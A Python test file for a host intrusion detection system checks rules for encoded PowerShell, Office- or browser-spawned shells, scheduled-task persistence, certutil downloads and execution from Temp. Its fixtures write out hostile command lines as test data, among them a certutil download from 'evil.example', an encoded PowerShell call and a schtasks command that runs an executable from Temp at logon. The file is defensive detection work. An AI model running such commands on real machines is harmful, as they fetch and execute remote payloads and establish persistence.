from datetime import datetime

from hids.events import Event
from hids.rules import (
    rule_browser_spawned_shell,
    rule_encoded_powershell,
    rule_exec_from_temp,
    rule_lolbin_download,
    rule_office_spawned_shell,
    rule_scheduled_task_created,
)

NOW = datetime(2026, 8, 20, 10, 0, 0)


def make_event(**kwargs) -> Event:
    defaults = dict(event_id=1, timestamp=NOW, computer="TESTHOST")
    defaults.update(kwargs)
    return Event(**defaults)


def test_encoded_powershell_fires_on_enc_flag():
    event = make_event(image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        command_line="powershell.exe -enc SQBFAFgA")
    assert rule_encoded_powershell(event) is not None


def test_encoded_powershell_does_not_fire_on_plain_script():
    event = make_event(image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        command_line="powershell.exe -File C:\\Scripts\\update.ps1")
    assert rule_encoded_powershell(event) is None


def test_office_spawned_shell_fires():
    event = make_event(image="C:\\Windows\\System32\\cmd.exe", command_line="cmd.exe /c whoami",
                        parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE")
    assert rule_office_spawned_shell(event) is not None


def test_office_spawned_non_shell_child_does_not_fire():
    event = make_event(image="C:\\Windows\\System32\\splwow64.exe", command_line="splwow64.exe 12345",
                        parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE")
    assert rule_office_spawned_shell(event) is None


def test_browser_spawned_shell_fires():
    event = make_event(image="C:\\Windows\\System32\\cmd.exe", command_line="cmd.exe /c payload.exe",
                        parent_image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")
    assert rule_browser_spawned_shell(event) is not None


def test_browser_spawning_itself_does_not_fire():
    event = make_event(image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                        command_line="chrome.exe --type=gpu-process",
                        parent_image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")
    assert rule_browser_spawned_shell(event) is None


def test_scheduled_task_created_fires_on_4698():
    event = Event(event_id=4698, timestamp=NOW, computer="TESTHOST",
                  extra={"TaskName": "\\Evil\\Persist"})
    assert rule_scheduled_task_created(event) is not None


def test_scheduled_task_deleted_does_not_fire():
    event = Event(event_id=4699, timestamp=NOW, computer="TESTHOST",
                  extra={"TaskName": "\\OldJob"})
    assert rule_scheduled_task_created(event) is None


def test_schtasks_create_via_commandline_fires():
    event = make_event(image="C:\\Windows\\System32\\schtasks.exe",
                        command_line="schtasks.exe /create /tn Updater /tr C:\\Temp\\upd.exe /sc onlogon")
    assert rule_scheduled_task_created(event) is not None


def test_schtasks_query_does_not_fire():
    event = make_event(image="C:\\Windows\\System32\\schtasks.exe", command_line="schtasks.exe /query /tn Updater")
    assert rule_scheduled_task_created(event) is None


def test_lolbin_download_fires_on_certutil_urlcache():
    event = make_event(image="C:\\Windows\\System32\\certutil.exe",
                        command_line="certutil.exe -urlcache -split -f http://evil.example/x.exe x.exe")
    assert rule_lolbin_download(event) is not None


def test_certutil_verify_does_not_fire():
    event = make_event(image="C:\\Windows\\System32\\certutil.exe", command_line="certutil.exe -verify C:\\certs\\a.cer")
    assert rule_lolbin_download(event) is None


def test_exec_from_temp_fires():
    event = make_event(image="C:\\Users\\evan\\AppData\\Local\\Temp\\dropper.exe", command_line="dropper.exe")
    assert rule_exec_from_temp(event) is not None


def test_exec_from_program_files_does_not_fire():
    event = make_event(image="C:\\Program Files\\Notepad++\\notepad++.exe", command_line="notepad++.exe")
    assert rule_exec_from_temp(event) is None
